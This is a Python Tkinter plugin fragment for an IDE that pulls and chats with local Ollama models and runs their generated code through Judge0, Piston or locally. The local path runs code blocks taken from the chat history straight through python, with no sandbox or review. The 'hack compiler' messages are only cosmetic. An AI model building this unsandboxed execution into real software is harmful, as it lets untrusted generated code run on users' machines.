        dialog.title("Pull AI Model")
        dialog.geometry("600x500")
        dialog.transient(self.ide_instance.root)
        dialog.grab_set()
        
        # Center the dialog
        dialog.update_idletasks()
        x = (dialog.winfo_screenwidth() // 2) - (dialog.winfo_width() // 2)
        y = (dialog.winfo_screenheight() // 2) - (dialog.winfo_height() // 2)
        dialog.geometry(f"+{x}+{y}")
        
        # Main content frame
        main_frame = ttk.Frame(dialog, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        ttk.Label(main_frame, text="Pull a new AI model:", font=("Arial", 14, "bold")).pack(pady=(0, 10))
        
        # Progress tracking
        self.pull_progress_var = tk.StringVar(value="Ready to pull a model")
        progress_label = ttk.Label(main_frame, textvariable=self.pull_progress_var, font=("Arial", 10))
        progress_label.pack(pady=5)
        
        self.pull_progress_bar = ttk.Progressbar(main_frame, mode='indeterminate')
        self.pull_progress_bar.pack(fill=tk.X, pady=5)
        
        # Progress text area
        progress_frame = ttk.LabelFrame(main_frame, text="Download Progress", padding="5")
        progress_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.pull_progress_text = scrolledtext.ScrolledText(progress_frame, wrap=tk.WORD, height=8, state=tk.DISABLED)
        self.pull_progress_text.pack(fill=tk.BOTH, expand=True)
        
        # Popular models section
        popular_frame = ttk.LabelFrame(main_frame, text="Popular Models", padding="10")
        popular_frame.pack(fill=tk.X, pady=5)
        
        popular_models = [
            ("tinyllama:1.1b", "TinyLlama (1.1B) - 637MB - Very fast, good for testing"),
            ("gemma:2b", "Google Gemma (2B) - 1.6GB - Lightweight and efficient"),
            ("codellama:7b", "Code Llama (7B) - 3.8GB - Excellent for code generation"),
            ("llama2:7b", "Meta Llama 2 (7B) - 3.8GB - General purpose AI"),
            ("mistral:7b", "Mistral 7B - 4.1GB - Fast and efficient"),
            ("phi3:mini", "Microsoft Phi-3 Mini - 2.3GB - Balanced performance"),
            ("starcoder2:3b", "StarCoder2 (3B) - 6.4GB - Code-focused AI"),
            ("deepseek-coder:1.3b", "DeepSeek Coder (1.3B) - 2.6GB - Code generation")
        ]
        
        # Create scrollable frame for models
        canvas = tk.Canvas(popular_frame, height=200)
        scrollbar = ttk.Scrollbar(popular_frame, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        for i, (model_name, description) in enumerate(popular_models):
            model_frame = ttk.Frame(scrollable_frame)
            model_frame.pack(fill=tk.X, pady=2, padx=5)
            
            # Model info
            info_frame = ttk.Frame(model_frame)
            info_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
            
            ttk.Label(info_frame, text=model_name, font=("Arial", 10, "bold")).pack(anchor=tk.W)
            ttk.Label(info_frame, text=description, font=("Arial", 9)).pack(anchor=tk.W)
            
            # Pull button
            pull_btn = ttk.Button(model_frame, text="⬇️ Pull", 
                                command=lambda m=model_name: self._start_pull_model(m, dialog))
            pull_btn.pack(side=tk.RIGHT, padx=5)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Custom model input
        custom_frame = ttk.LabelFrame(main_frame, text="Custom Model", padding="10")
        custom_frame.pack(fill=tk.X, pady=5)
        
        input_frame = ttk.Frame(custom_frame)
        input_frame.pack(fill=tk.X)
        
        ttk.Label(input_frame, text="Model name:").pack(side=tk.LEFT, padx=(0, 5))
        custom_entry = ttk.Entry(input_frame)
        custom_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        custom_entry.insert(0, "llama2:7b")  # Default
        
        ttk.Button(input_frame, text="⬇️ Pull Custom", 
                  command=lambda: self._start_pull_model(custom_entry.get().strip(), dialog)).pack(side=tk.LEFT)
        
        # Control buttons
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=10)
        
        self.cancel_btn = ttk.Button(button_frame, text="Cancel", command=dialog.destroy)
        self.cancel_btn.pack(side=tk.RIGHT, padx=5)
        
        self.close_btn = ttk.Button(button_frame, text="Close", command=dialog.destroy, state=tk.DISABLED)
        self.close_btn.pack(side=tk.RIGHT, padx=5)
        
        # Store dialog reference
        self.pull_dialog = dialog
    
    def _start_pull_model(self, model_name, dialog):
        """Start pulling a model with progress tracking"""
        if not model_name:
            messagebox.showwarning("Warning", "Please enter a model name")
            return
        
        # Update progress display
        self.pull_progress_var.set(f"Pulling {model_name}...")
        self.pull_progress_bar.start()
        
        # Clear progress text
        self.pull_progress_text.config(state=tk.NORMAL)
        self.pull_progress_text.delete(1.0, tk.END)
        self.pull_progress_text.config(state=tk.DISABLED)
        
        # Start pull in background thread
        thread = threading.Thread(target=self._pull_model_with_progress, args=(model_name,))
        thread.daemon = True
        thread.start()
    
    def _pull_model_with_progress(self, model_name):
        """Pull model with progress tracking"""
        try:
            # Use subprocess to pull model with real-time output
            process = subprocess.Popen(
                ['ollama', 'pull', model_name],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # Stream output to progress text
            for line in process.stdout:
                if line.strip():
                    self._update_pull_progress(line.strip())
                    time.sleep(0.1)  # Small delay for UI updates
            
            process.wait()
            
            if process.returncode == 0:
                self.pull_progress_var.set(f"✅ Successfully pulled {model_name}")
                self.pull_progress_bar.stop()
                self._update_pull_progress(f"✅ Model {model_name} is ready to use!")
                
                # Refresh model list
                self.refresh_models()
                
                # Enable close button
                self.close_btn.config(state=tk.NORMAL)
                
                # Auto-close dialog after 3 seconds
                threading.Timer(3.0, self.pull_dialog.destroy).start()
            else:
                self.pull_progress_var.set(f"❌ Failed to pull {model_name}")
                self.pull_progress_bar.stop()
                self._update_pull_progress(f"❌ Error pulling {model_name}")
                
        except Exception as e:
            self.pull_progress_var.set(f"❌ Error: {str(e)}")
            self.pull_progress_bar.stop()
            self._update_pull_progress(f"❌ Exception: {str(e)}")
    
    def _update_pull_progress(self, message):
        """Update pull progress text"""
        if hasattr(self, 'pull_progress_text') and self.pull_progress_text:
            self.pull_progress_text.config(state=tk.NORMAL)
            timestamp = time.strftime("%H:%M:%S")
            self.pull_progress_text.insert(tk.END, f"[{timestamp}] {message}\n")
            self.pull_progress_text.see(tk.END)
            self.pull_progress_text.config(state=tk.DISABLED)
    
    def pull_model(self, model_name, dialog=None):
        """Pull a model from Ollama"""
        if not model_name:
            messagebox.showwarning("Warning", "Please enter a model name")
            return
        
        if dialog:
            dialog.destroy()
        
        self._update_ollama_status(f"⬇️ Pulling model: {model_name}")
        self._update_status(f"Downloading {model_name}... This may take several minutes.")
        
        # Run in background thread
        thread = threading.Thread(target=self._pull_model_thread, args=(model_name,))
        thread.daemon = True
        thread.start()
    
    def _pull_model_thread(self, model_name):
        """Background thread to pull model"""
        try:
            # Use subprocess to pull model
            process = subprocess.Popen(
                ['ollama', 'pull', model_name],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Stream output
            for line in process.stdout:
                if "pulling" in line.lower() or "downloading" in line.lower():
                    self._update_status(line.strip())
            
            process.wait()
            
            if process.returncode == 0:
                self._update_ollama_status(f"✅ Successfully pulled {model_name}")
                self._update_status(f"✅ Model {model_name} ready to use!")
                self.refresh_models()
            else:
                error = process.stderr.read()
                self._update_ollama_status(f"❌ Failed to pull {model_name}: {error}")
                self._update_status(f"❌ Error: {error}")
                
        except Exception as e:
            self._update_ollama_status(f"❌ Error pulling model: {str(e)}")
            self._update_status(f"❌ Error: {str(e)}")
    
    def run_selected_model(self):
        """Run the selected model"""
        selection = self.model_listbox.curselection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a model to run")
            return
        
        model_name = self.available_models[selection[0]]
        self._update_status(f"▶️ Running model: {model_name}")
        
        # Run model in background
        thread = threading.Thread(target=self._run_model_thread, args=(model_name,))
        thread.daemon = True
        thread.start()
    
    def _run_model_thread(self, model_name):
        """Background thread to run model"""
        try:
            # Test if model is responsive
            response = requests.post(f"{self.ollama_url}/api/generate", 
                                   json={
                                       "model": model_name,
                                       "prompt": "Hello, are you working?",
                                       "stream": False
                                   }, timeout=10)
            
            if response.status_code == 200:
                result = response.json()
                self._update_status(f"✅ {model_name} is running and responsive!")
                self._update_chat("🤖 AI Assistant", f"✅ {model_name} is ready to help you with coding!")
            else:
                self._update_status(f"❌ {model_name} not responding")
                
        except Exception as e:
            self._update_status(f"❌ Error running {model_name}: {str(e)}")
    
    def test_selected_model(self):
        """Test the selected model with a coding prompt"""
        selection = self.model_listbox.curselection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a model to test")
            return
        
        model_name = self.available_models[selection[0]]
        test_prompt = "Write a simple Python function that calculates the factorial of a number."
        
        self._update_status(f"🧪 Testing {model_name} with coding prompt...")
        self._update_chat("🧪 Test", f"Testing {model_name} with: {test_prompt}")
        
        # Test in background
        thread = threading.Thread(target=self._test_model_thread, args=(model_name, test_prompt))
        thread.daemon = True
        thread.start()
    
    def _test_model_thread(self, model_name, prompt):
        """Background thread to test model"""
        try:
            response = requests.post(f"{self.ollama_url}/api/generate", 
                                   json={
                                       "model": model_name,
                                       "prompt": prompt,
                                       "stream": False
                                   }, timeout=30)
            
            if response.status_code == 200:
                result = response.json()
                response_text = result.get('response', 'No response')
                self._update_chat(f"🤖 {model_name}", response_text)
                self._update_status(f"✅ {model_name} test completed successfully!")
                
                # Check if response contains code
                if any(keyword in response_text.lower() for keyword in ['def ', 'function', 'class ', 'import ', 'print(']):
                    self._update_status("💡 Generated code detected! You can execute it using the buttons below.")
            else:
                self._update_chat("❌ Error", f"Model test failed: {response.status_code}")
                
        except Exception as e:
            self._update_chat("❌ Error", f"Test failed: {str(e)}")
    
    def send_chat(self):
        """Send chat message to selected model"""
        selection = self.model_listbox.curselection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a model first")
            return
        
        model_name = self.available_models[selection[0]]
        prompt = self.chat_entry.get().strip()
        
        if not prompt:
            messagebox.showwarning("Warning", "Please enter a message")
            return
        
        self._update_chat("👤 You", prompt)
        self.chat_entry.delete(0, tk.END)
        
        # Send in background
        thread = threading.Thread(target=self._chat_thread, args=(model_name, prompt))
        thread.daemon = True
        thread.start()
    
    def _chat_thread(self, model_name, prompt):
        """Background thread for chat"""
        try:
            self._update_status(f"🤖 {model_name} is thinking...")
            
            response = requests.post(f"{self.ollama_url}/api/generate", 
                                   json={
                                       "model": model_name,
                                       "prompt": prompt,
                                       "stream": False
                                   }, timeout=60)
            
            if response.status_code == 200:
                result = response.json()
                response_text = result.get('response', 'No response')
                self._update_chat(f"🤖 {model_name}", response_text)
                self._update_status(f"✅ Response received from {model_name}")
                
                # Check if it's code
                if any(keyword in response_text.lower() for keyword in ['def ', 'function', 'class ', 'import ', 'print(']):
                    self._update_status("💡 Code detected! You can execute it using the execution buttons.")
            else:
                self._update_chat("❌ Error", f"Chat failed: {response.status_code}")
                
        except Exception as e:
            self._update_chat("❌ Error", f"Chat failed: {str(e)}")
    
    def execute_code(self, method):
        """Execute the last generated code"""
        # Get the last AI response that contains code
        chat_content = self.chat_history.get(1.0, tk.END)
        
        # Extract code from chat (simple extraction)
        lines = chat_content.split('\n')
        code_lines = []
        in_code = False
        
        for line in lines:
            if '```' in line:
                in_code = not in_code
                continue
            if in_code and line.strip():
                code_lines.append(line)
        
        if not code_lines:
            messagebox.showwarning("Warning", "No code found in chat history")
            return
        
        code = '\n'.join(code_lines)
        self._update_status(f"🚀 Executing code using {method}...")
        
        # Execute in background
        thread = threading.Thread(target=self._execute_code_thread, args=(code, method))
        thread.daemon = True
        thread.start()
    
    def _execute_code_thread(self, code, method):
        """Background thread for code execution"""
        try:
            if method == "judge0":
                result = self._execute_with_judge0(code)
            elif method == "piston":
                result = self._execute_with_piston(code)
            elif method == "local":
                result = self._execute_locally(code)
            else:
                result = {"success": False, "error": "Unknown execution method"}
            
            if result["success"]:
                self._update_status(f"✅ Code executed successfully with {method}!")
                self._update_status(f"Output: {result.get('output', '')}")
            else:
                self._update_status(f"❌ Execution failed: {result.get('error', '')}")
                
        except Exception as e:
            self._update_status(f"❌ Execution error: {str(e)}")
    
    def _execute_with_judge0(self, code):
        """Execute code with Judge0"""
        try:
            # Simple Python execution
            submit_data = {
                "source_code": code,
                "language_id": 71,  # Python 3
                "stdin": ""
            }
            
            response = requests.post(f"{self.judge0_url}/submissions", 
                                   json=submit_data, timeout=10)
            
            if response.status_code == 201:
                submission = response.json()
                token = submission["token"]
                
                # Poll for result
                for _ in range(10):
                    time.sleep(1)
                    result_response = requests.get(f"{self.judge0_url}/submissions/{token}", timeout=5)
                    if result_response.status_code == 200:
                        result = result_response.json()
                        if result["status"]["id"] == 3:  # Accepted
                            return {
                                "success": True,
                                "output": result.get("stdout", ""),
                                "error": result.get("stderr", "")
                            }
                
                return {"success": False, "error": "Judge0 timeout"}
            else:
                return {"success": False, "error": f"Judge0 submission failed: {response.status_code}"}
                
        except Exception as e:
            return {"success": False, "error": f"Judge0 error: {str(e)}"}
    
    def _execute_with_piston(self, code):
        """Execute code with Piston"""
        try:
            execute_data = {
                "language": "python",
                "version": "*",
                "files": [{"content": code}],
                "stdin": ""
            }
            
            response = requests.post(f"{self.piston_url}/api/v2/execute", 
                                   json=execute_data, timeout=30)
            
            if response.status_code == 200:
                result = response.json()
                return {
                    "success": True,
                    "output": result.get("run", {}).get("stdout", ""),
                    "error": result.get("run", {}).get("stderr", "")
                }
            else:
                return {"success": False, "error": f"Piston execution failed: {response.status_code}"}
                
        except Exception as e:
            return {"success": False, "error": f"Piston error: {str(e)}"}
    
    def _execute_locally(self, code):
        """Execute code locally"""
        try:
            # Write to temp file
            with open("temp_ai_code.py", "w") as f:
                f.write(code)
            
            # Execute
            result = subprocess.run(['python', 'temp_ai_code.py'], 
                                  capture_output=True, text=True, timeout=30)
            
            # Cleanup
            try:
                os.remove("temp_ai_code.py")
            except:
                pass
            
            return {
                "success": result.returncode == 0,
                "output": result.stdout,
                "error": result.stderr
            }
            
        except Exception as e:
            return {"success": False, "error": f"Local execution error: {str(e)}"}
    
    def _update_chat(self, sender, message):
        """Update chat history"""
        if hasattr(self, 'chat_history') and self.chat_history:
            self.chat_history.config(state=tk.NORMAL)
            timestamp = time.strftime("%H:%M:%S")
            self.chat_history.insert(tk.END, f"[{timestamp}] {sender}: {message}\n\n")
            self.chat_history.see(tk.END)
            self.chat_history.config(state=tk.DISABLED)
    
    def _update_status(self, message):
        """Update status display"""
        if hasattr(self, 'status_text') and self.status_text:
            self.status_text.config(state=tk.NORMAL)
            timestamp = time.strftime("%H:%M:%S")
            self.status_text.insert(tk.END, f"[{timestamp}] {message}\n")
            self.status_text.see(tk.END)
            self.status_text.config(state=tk.DISABLED)
    
    def start_compilation_gears(self):
        """Start the compilation gears animation"""
        try:
            from compilation_gears_animation import CompilationEngine
            compilation_engine = CompilationEngine(self.ide_instance.root)
            self._update_status("⚙️ Compilation gears started!")
            self._update_chat("⚙️ Compilation Engine", "🔥 Gears spinning and ready to compile!")
        except ImportError:
            messagebox.showwarning("Missing Module", "compilation_gears_animation.py not found!")
            self._update_status("❌ Compilation gears module not found")
    
    def demo_code_spitter(self):
        """Demo the code spitter functionality"""
        self._update_chat("🔥 Code Spitter", "Spitting out assembly code:")
        
        # Simulate code spitting
        assembly_codes = [
            "mov eax, 0x12345678",
            "push ebp\nmov ebp, esp",
            "int 0x80\nret",
            "xor eax, eax\ninc eax",
            "call [0x401000]\nadd esp, 4"
        ]
        
        for code in assembly_codes[:3]:  # Show first 3
            self._update_chat("💀 Assembly", f"Spitting: {code}")
        
        self._update_status("🔥 Code spitter demo completed!")
    
    def hack_compilation(self):
        """Simulate hack compilation with gears"""
        self._update_chat("💀 Hack Compiler", "Starting elite compilation...")
        self._update_status("⚙️ Gears spinning for hack compilation...")
        
        # Simulate compilation steps
        steps = [
            "🔥 Preprocessing hack files...",
            "⚡ Parsing exploit syntax...",
            "🧠 Analyzing attack vectors...",
            "💉 Injecting shellcode...",
            "🎯 Linking with system libraries...",
            "💀 Generating malicious executable...",
            "✅ Hack compilation complete!"
        ]
        
        def compilation_step(step_index):
            if step_index < len(steps):
                step = steps[step_index]
                self._update_chat("⚙️ Compilation Gear", step)
                # Schedule next step
                threading.Timer(1.0, lambda: compilation_step(step_index + 1)).start()
            else:
                self._update_chat("💀 Hack Compiler", "🎉 Elite hack executable created!")
                self._update_status("✅ Hack compilation successful!")
        
        compilation_step(0)
    
    def apply_forum_theme(self, theme_key):
        """Apply old-school forum theme"""
        if theme_key not in self.forum_themes:
            return
        
        theme = self.forum_themes[theme_key]
        self._update_chat("🎨 Theme Manager", f"Applying {theme['name']} theme...")
        self._update_status(f"🎨 {theme['name']} theme applied!")
        
        # Apply theme colors to the IDE
        try:
            # This would apply the theme to the main IDE
            if hasattr(self.ide_instance, 'root'):
                self.ide_instance.root.configure(bg=theme['bg_color'])
            
            messagebox.showinfo(
                "🎨 Theme Applied", 
                f"Applied {theme['name']} theme!\n"
                f"Background: {theme['bg_color']}\n"
                f"Text: {theme['text_color']}\n"
                f"Accent: {theme['accent_color']}"
            )
        except Exception as e:
            self._update_status(f"❌ Theme application error: {e}")
    
    def enable_code_graffiti(self):
        """Enable code graffiti background"""
        self.graffiti_enabled = True
        self._update_chat("🎨 Graffiti System", "Code graffiti enabled!")
        self._update_status("🔥 Graffiti mode activated!")
        
        # Show graffiti preview
        graffiti_preview = [
            "// 💀 HACKED BY ELITE 💀",
            "mov eax, 0x1337BABE",
            "push ebp; mov ebp, esp",
            "// 🔥 GEARS SPINNING 🔥"
        ]
        
        for graffiti in graffiti_preview:
            self._update_chat("🎨 Graffiti", graffiti)
    
    def spray_random_code(self):
        """Spray random code graffiti"""
        code_categories = list(self.graffiti_code_snippets.keys())
        category = random.choice(code_categories)
        code_snippet = random.choice(self.graffiti_code_snippets[category])
        
        self._update_chat("🎨 Code Spray", f"Spraying {category} graffiti:")
        self._update_chat("💀 Graffiti", code_snippet)
        self._update_status(f"🎨 {category} graffiti sprayed!")
    
    def clear_code_graffiti(self):
        """Clear all code graffiti"""
        self.graffiti_enabled = False
        self._update_chat("🧹 Graffiti Cleaner", "Clearing all graffiti...")
        self._update_status("🧹 Graffiti cleared!")
    
    def save_graffiti_style(self):
        """Save current graffiti style"""
        self._update_chat("💾 Style Saver", "Saving graffiti style...")
        self._update_status("💾 Graffiti style saved!")
        
        # Create graffiti style file
        try:
            with open("graffiti_style.txt", "w") as f:
                f.write("🔥 GRAFFITI IDE STYLE 🔥\n")
                f.write("=" * 50 + "\n")
                f.write(f"Enabled: {self.graffiti_enabled}\n")
                f.write(f"Theme: UnknownCheats.me\n")
                f.write(f"Code Categories: {len(self.graffiti_code_snippets)}\n")
                f.write("\nCode Snippets:\n")
                
                for category, snippets in self.graffiti_code_snippets.items():
                    f.write(f"\n{category.upper()}:\n")
                    for snippet in snippets[:2]:  # Save first 2 of each category
                        f.write(f"  {snippet}\n")
            
            messagebox.showinfo("💾 Saved", "Graffiti style saved to graffiti_style.txt")
        except Exception as e:
            self._update_status(f"❌ Save error: {e}")
    
    def toggle_background_gears(self):
        """Toggle background gear animation"""
        if self.gears_running:
            self.stop_background_animations()
            self._update_status("⏹️ Background gears stopped")
            self._update_chat("⚙️ Background Gears", "Gears stopped spinning")
        else:
            self.start_background_animations()
            self._update_status("⚙️ Background gears started")
            self._update_chat("⚙️ Background Gears", "Gears spinning in background")
    
    def refresh_background_graffiti(self):
        """Refresh the background graffiti"""
        self.create_subtle_graffiti_background()
        self._update_status("🎨 Background graffiti refreshed")
        self._update_chat("🎨 Background Graffiti", "Fresh graffiti sprayed in background")
    
    def start_background_animations(self):
        """Start subtle background graffiti and gear animations"""
        if not self.background_canvas:
            return
        
        # Create subtle graffiti background
        self.create_subtle_graffiti_background()
        
        # Start subtle gear animation
        self.start_subtle_gears()
    
    def create_subtle_graffiti_background(self):
        """Create subtle graffiti in the background"""
        if not self.background_canvas:
            return
        
        # Get canvas dimensions
        width = self.background_canvas.winfo_width()
        height = self.background_canvas.winfo_height()
        
        if width <= 1 or height <= 1:  # Canvas not ready yet
            self.background_canvas.after(100, self.create_subtle_graffiti_background)
            return
        
        # Clear existing graffiti
        self.background_canvas.delete("background_graffiti")
        
        # Add subtle graffiti (smaller, more transparent)
        subtle_graffiti = [
            ("mov eax, 1", "#004400", 8, "Consolas"),
            ("push ebp", "#006600", 7, "Consolas"),
            ("int 0x80", "#008800", 8, "Consolas"),
            ("xor eax, eax", "#004400", 7, "Consolas"),
            ("call 0x401000", "#006600", 6, "Consolas"),
            ("ret", "#008800", 9, "Consolas"),
            ("nop", "#004400", 8, "Consolas"),
            ("jmp $+2", "#006600", 7, "Consolas"),
            ("// elite", "#008800", 6, "Consolas"),
            ("// hack", "#004400", 8, "Consolas"),
            ("0x401000", "#006600", 7, "Consolas"),
            ("0xDEADBEEF", "#008800", 6, "Consolas")
        ]
        
        # Add 8-12 subtle graffiti items
        import random
        num_graffiti = random.randint(8, 12)
        
        for _ in range(num_graffiti):
            text, color, size, font = random.choice(subtle_graffiti)
            
            # Random position (avoid center where main content is)
            if random.random() < 0.5:  # Left side
                x = random.randint(20, width // 3)
            else:  # Right side
                x = random.randint(2 * width // 3, width - 50)
            
            y = random.randint(20, height - 50)
            
            # Create subtle graffiti
            self.background_canvas.create_text(
                x, y,
                text=text,
                fill=color,
                font=(font, size),
                angle=random.uniform(-10, 10),
                tags="background_graffiti"
            )
    
    def start_subtle_gears(self):
        """Start subtle spinning gears in background"""
        if not self.background_canvas:
            return
        
        self.gears_running = True
        self.animate_subtle_gears()
    
    def animate_subtle_gears(self):
        """Animate subtle background gears"""
        if not self.gears_running or not self.background_canvas:
            return
        
        # Create small subtle gears in corners
        self.create_subtle_gear(50, 50, 20, "#004400")  # Top left
        self.create_subtle_gear(self.background_canvas.winfo_width() - 50, 50, 20, "#006600")  # Top right
        self.create_subtle_gear(50, self.background_canvas.winfo_height() - 50, 20, "#008800")  # Bottom left
        self.create_subtle_gear(self.background_canvas.winfo_width() - 50, self.background_canvas.winfo_height() - 50, 20, "#004400")  # Bottom right
        
        # Schedule next animation
        self.background_canvas.after(2000, self.animate_subtle_gears)
    
    def create_subtle_gear(self, x, y, radius, color):
        """Create a subtle spinning gear"""
        if not self.background_canvas:
            return
        
        # Create small gear
        self.background_canvas.create_oval(
            x - radius, y - radius,
            x + radius, y + radius,
            fill="", outline=color, width=1,
            tags="background_gear"
        )
        
        # Create center hole
        self.background_canvas.create_oval(
            x - radius * 0.3, y - radius * 0.3,
            x + radius * 0.3, y + radius * 0.3,
            fill="#1a1a1a", outline=color, width=1,
            tags="background_gear"
        )
        
        # Add some gear teeth (simple lines)
        for i in range(6):
            angle = (2 * 3.14159 * i) / 6
            tooth_x = x + (radius + 5) * math.cos(angle)
            tooth_y = y + (radius + 5) * math.sin(angle)
            
            self.background_canvas.create_line(
                x, y, tooth_x, tooth_y,
                fill=color, width=1,
                tags="background_gear"
            )
    
    def stop_background_animations(self):
        """Stop all background animations"""
        self.gears_running = False
        if self.background_canvas:
            self.background_canvas.delete("background_graffiti")
            self.background_canvas.delete("background_gear")
    
    def initialize_ai_features(self):
        """Initialize enhanced AI features"""
        print("🤖 Initializing Enhanced AI Features...")
        
        if not AI_HELPERS_AVAILABLE:
            print("⚠️ AI helper classes not available - using basic functionality")
            return
        
        try:
            # AI Code Generator
            self.ai_code_generator = AICodeGenerator(self)
            
            # AI Debugger
            self.ai_debugger = AIDebugger(self)
            
            # AI Optimizer
            self.ai_optimizer = AIOptimizer(self)
            
            # AI Security Analyzer
            self.ai_security_analyzer = AISecurityAnalyzer(self)
            
            # AI Documentation Generator
            self.ai_documentation_generator = AIDocumentationGenerator(self)
            
            # AI Test Generator
            self.ai_test_generator = AITestGenerator(self)
            
            # AI Refactoring Engine
            self.ai_refactoring_engine = AIRefactoringEngine(self)
            
            # AI Pattern Recognizer
            self.ai_pattern_recognizer = AIPatternRecognizer(self)
            
            print("✅ Enhanced AI Features initialized!")
        except Exception as e:
            print(f"⚠️ Error initializing AI features: {e}")
            print("Using basic functionality")
    
    def generate_code_with_ai(self, prompt, language="python", context=""):
        """Generate code using AI"""
        if not self.ai_code_generator:
            self.initialize_ai_features()
        
        return self.ai_code_generator.generate_code(prompt, language, context)
    
    def debug_code_with_ai(self, code, error_message=""):
        """Debug code using AI"""
        if not self.ai_debugger:
            self.initialize_ai_features()
        
        return self.ai_debugger.analyze_and_fix(code, error_message)
    
    def optimize_code_with_ai(self, code, language="python"):
        """Optimize code using AI"""
        if not self.ai_optimizer:
            self.initialize_ai_features()
        
        return self.ai_optimizer.optimize_code(code, language)
    
    def analyze_security_with_ai(self, code, language="python"):
        """Analyze code security using AI"""
        if not self.ai_security_analyzer:
            self.initialize_ai_features()
        
        return self.ai_security_analyzer.analyze_security(code, language)
    
    def generate_documentation_with_ai(self, code, language="python"):
        """Generate documentation using AI"""
        if not self.ai_documentation_generator:
            self.initialize_ai_features()
        
        return self.ai_documentation_generator.generate_docs(code, language)
    
    def generate_tests_with_ai(self, code, language="python"):
        """Generate tests using AI"""
        if not self.ai_test_generator:
            self.initialize_ai_features()
        
        return self.ai_test_generator.generate_tests(code, language)
    
    def refactor_code_with_ai(self, code, language="python", refactor_type="general"):
        """Refactor code using AI"""
        if not self.ai_refactoring_engine:
            self.initialize_ai_features()
        
        return self.ai_refactoring_engine.refactor_code(code, language, refactor_type)
    
    def recognize_patterns_with_ai(self, code, language="python"):
        """Recognize code patterns using AI"""
        if not self.ai_pattern_recognizer:
            self.initialize_ai_features()
        
        return self.ai_pattern_recognizer.recognize_patterns(code, language)

def integrate_local_ai_compiler(ide_instance):
    """Integrate local AI model manager into the n0mn0m IDE"""
    ai_compiler = LocalAICompilerManager(ide_instance)
    
    # Add to Tools menu
    if hasattr(ide_instance, 'menubar'):
        tools_menu = None
        for i in range(ide_instance.menubar.index(tk.END)):
            if ide_instance.menubar.entrycget(i, "label") == "Tools":
                tools_menu = ide_instance.menubar.winfo_children()[i]
                break
        
        if tools_menu:
            tools_menu.add_command(label="🤖 AI Models & Compilers", 
                                 command=lambda: ide_instance.notebook.select(ai_compiler.ide_instance.notebook.children['!frame']))
    
    ide_instance.local_ai_compiler = ai_compiler
    print("🤖 Local AI Model & Compiler Manager loaded successfully!")

def quick_start_guide():
    """Display quick start guide for local AI models"""
    guide = """
🚀 Quick Start Guide for Local AI Models

1. Start Ollama:
   ollama serve

2. Pull a model (choose one):
   ollama pull llama2:7b        # General purpose (3.8GB)
   ollama pull codellama:7b     # Code generation (3.8GB)
   ollama pull mistral:7b       # Fast and efficient (4.1GB)
   ollama pull tinyllama:1.1b   # Very fast (637MB)
   ollama pull gemma:2b         # Lightweight (1.6GB)

3. Test your model:
   ollama run llama2:7b "Write a Python function to sort a list"

4. Use in IDE:
   - Select your model from the list
   - Ask it to generate code
   - Execute the generated code with Judge0, Piston, or locally

💡 Pro Tips:
- Start with tinyllama:1.1b for testing (fastest download)
- Use codellama:7b for code generation
- Use llama2:7b for general AI assistance
    """
    print(guide)
